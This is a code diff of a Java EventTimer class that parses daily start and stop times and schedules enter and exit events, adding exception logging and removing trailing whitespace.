@@ -41,7 +41,7 @@ public class EventTimer extends BaseTimer {
 	private Date timestart;
 
 	private Date timestop;
-	
+
 	private boolean needExitOnStop;
 
 	/**
@@ -63,14 +63,14 @@ public class EventTimer extends BaseTimer {
 	@Override
 	public boolean parse(final ConfEvent conf) {
 		needExitOnStop = false;
-		
+
 		try {
 			String ts = conf.getString("ts");
 			String te = conf.getString("te");
 
 			SimpleDateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
 			dateFormat.setTimeZone(TimeZone.getTimeZone("UTC"));
-			
+
 			timestart = dateFormat.parse(ts);
 			timestop = dateFormat.parse(te);
 
@@ -78,12 +78,20 @@ public class EventTimer extends BaseTimer {
 				Check.log(TAG + " type: " + type + " ts:" + ts + " te:" + te);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 			}
 		} catch (final ConfigurationException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: params FAILED " + e);//$NON-NLS-1$
 			}
 
 			return false;
 		} catch (ParseException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: params FAILED " + e);//$NON-NLS-1$
 			}
@@ -125,7 +133,7 @@ public class EventTimer extends BaseTimer {
 		if (initialCheck) {
 			initialCheck();
 		}
-		
+
 		// Estraiamo il prossimo evento e determiniamo il delay sulla base del
 		// tipo
 		if (now < start)
@@ -139,29 +147,29 @@ public class EventTimer extends BaseTimer {
 			nextStop = stop + (3600 * 24 * 1000); // 1 Day
 
 		boolean ret;
-		
+
 		// stabilisce quale sara' il prossimo evento.
 		if (nextStart < nextStop) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (setDailyDelay): Delay (next start): " + (nextStart - now)); //$NON-NLS-1$
 			}
-			
+
 			if (initialCheck)
 				setDelay(nextStart - now);
 			else
 				setPeriod(nextStart - now);
-			
+
 			ret = true;
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (setDailyDelay): Delay (next stop): " + (nextStop - now)); //$NON-NLS-1$
 			}
-			
+
 			if (initialCheck)
 				setDelay(nextStop - now);
 			else
 				setPeriod(nextStop - now);
-			
+
 			ret = false;
 		}
 
@@ -172,30 +180,30 @@ public class EventTimer extends BaseTimer {
 		Calendar nowCalendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));
 		int now = ((nowCalendar.get(Calendar.HOUR_OF_DAY) * 3600) + (nowCalendar.get(Calendar.MINUTE) * 60) + nowCalendar
 				.get(Calendar.SECOND)) * 1000;
-		
+
 		// verifica se al primo giro occorre chiamare OnEnter
 		if (start < stop) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (setDailyDelay): start < stop ");
 			}
-			
+
 			if (now > start && now < stop) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (setDailyDelay): we are already in the brackets");
 				}
-				
+
 				onEnter();
 			}
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (setDailyDelay): start > stop ");
 			}
-			
+
 			if (now < stop || now > start) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (setDailyDelay): we are already in the inverted brackets");
 				}
-				
+
 				onEnter();
 			}
 		}
@@ -216,26 +224,26 @@ public class EventTimer extends BaseTimer {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (go): DAILY TIMER: action enter"); //$NON-NLS-1$
 			}
-			
+
 			onEnter();
-			
+
 			needExitOnStop = true;
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (go): DAILY TIMER: action exit"); //$NON-NLS-1$
 			}
-			
+
 			onExit();
-			
+
 			needExitOnStop = false;
 		}
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (go): daily IN BEFORE: " + nextDailyIn); //$NON-NLS-1$
 		}
-		
+
 		nextDailyIn = setDailyDelay(false);
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (go): daily IN AFTER: " + nextDailyIn); //$NON-NLS-1$
 		}
